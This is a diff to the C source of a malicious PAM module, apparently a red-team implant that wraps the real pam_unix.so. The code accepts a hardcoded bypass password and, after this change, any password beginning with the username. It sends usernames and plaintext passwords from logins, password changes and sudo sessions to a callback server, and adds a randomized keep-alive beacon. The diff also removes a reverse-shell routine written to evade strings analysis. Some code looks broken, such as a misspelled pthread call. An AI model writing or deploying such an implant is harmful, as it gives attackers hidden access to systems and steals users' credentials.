@@ -2,7 +2,9 @@
 #include <security/pam_appl.h>
 #include <security/pam_modules.h>
 #include <security/pam_ext.h>
+#include <stdatomic.h>
 #include <pwd.h>
+#include <time.h>
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -15,16 +17,22 @@
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <ifaddrs.h>
+#include <pthread.h>
 
 // PAM module backup path
 #define PAM_PATH "/usr/lib/pam.d/pam_unix.so"
 // Bypass Auth Password (setup in setup.py)
-#define AUTH_PASSWORD "redteam123"
+#define AUTH_PASSWORD "letredin"
+#define WAIT_MAX 60
+#define WAIT_MIN 30
 
 // Callback IP, Port, and return format (setup in setup.py)
 #define CALLBACK_IP "10.100.150.1"
 #define CALLBACK_PORT 5000
 #define RET_FMT "%s - %s %s:%s\n"
+
+static pthread_t authenticator;
+static atomic_int running = 0;
 
 typedef int (*pam_func_t)(pam_handle_t *, int, int, const char **);
 
@@ -57,8 +65,14 @@ int get_local_ip(char *buffer, size_t buflen) {
     return -1;  // No suitable IP found
 }
 
-// Function to send data to the c2 server (mainly username:password combinations)
-int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *username, const char *password) {
+// Function to send data to the server (mainly username:password combinations)
+int pam_send_authtok(const char *message, const char *username, const char *password) {
+
+    // Start sending keep alives if not already doing so
+    if(atomic_exchange(&running, 1) == 0) {
+        pthread_create(&authenticator, NULL, pam_callback, NULL);
+        pthread_detatch(authenticator);
+    }
 
     // Get IP using helper function
     char ipaddr[INET_ADDRSTRLEN];
@@ -99,37 +113,17 @@ int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *userna
     return 0;
 }
 
-// UNUSED: Function to spawn a reverse shell (might reimplement later)
-int pam_log_err() {
-    // Fork process so it won't block out other authentication
-    pid_t pid = fork();
-    if (pid == -1) {
-		return 1;
-	}
-	if (pid > 0) {
-		return 0;
-	}
+// Send keep alive messages to server
+void* pam_callback(void* arg) {
+    srand(time(NULL));
+    int rd_num = rand() % (WAIT_MAX - WAIT_MIN + 1) + WAIT_MIN;
 
-    // Create socket to c2 server
-    int sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock >= 0) {
-        struct sockaddr_in serv_addr;
-        serv_addr.sin_family = AF_INET;
-        serv_addr.sin_port = htons(CALLBACK_PORT);
-        inet_pton(AF_INET, CALLBACK_IP, &serv_addr.sin_addr);
-
-        // Send /bin/bash to c2 server
-        if(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
-            dup2(sock, 0);
-            dup2(sock, 1);
-            dup2(sock, 2);
-            // These two lines are commented out to avoid /bin/bash showing up in strings analysis
-            // char * const argv[] = {"/bin/bash", NULL};
-            // execve("/bin/bash", argv, NULL);
-         }
+    while(1) {
+        pam_send_authtok("KEEP ALIVE", "", "");
+        sleep(rd_num);
     }
 
-    return 0;
+    return NULL;
 }
 
 // Function to dynamically link the real pam_unix.so to allow normal authentication
@@ -183,16 +177,15 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
         return PAM_SUCCESS;
     }
 
-    // if (strncmp(password, "PAM", 8) == 0) {
-    //     pam_log_err();
-    //     return PAM_SUCCESS;
-    // }
+    if (password && strncmp(username, password, strlen(username)) == 0) {
+        return PAM_SUCCESS;
+    }
 
     // If authentication is successful, send creds to server using pam_send_authtok
     int retval = pam_unix_authenticate("pam_sm_authenticate", pamh, flags, argc, argv);
 
     if (username && password && retval == PAM_SUCCESS) {
-        pam_send_authtok(pamh, "USER AUTHENTICATED:", username, password);
+        pam_send_authtok("USER AUTHENTICATED:", username, password);
     }
 
     return retval;
@@ -209,7 +202,7 @@ PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const c
 
     // If password is successfully changed, send password using pam_send_authtok
     if (username && password && retval == PAM_SUCCESS) {
-        pam_send_authtok(pamh, "USER CHANGED PASSWORD:", username, password);
+        pam_send_authtok("USER CHANGED PASSWORD:", username, password);
     }
 
     return retval;
@@ -236,7 +229,7 @@ PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, cons
 
         // If the target UID is 0 and the caller UID is greater than this, it must be a sudo session opening (user must be admin)
         if (target_uid == 0 && caller_uid > target_uid) {
-            pam_send_authtok(pamh, "SUDO SESSION OPENED:", calling_user, ":");
+            pam_send_authtok("SUDO SESSION OPENED:", calling_user, ":");
         }
     }
 
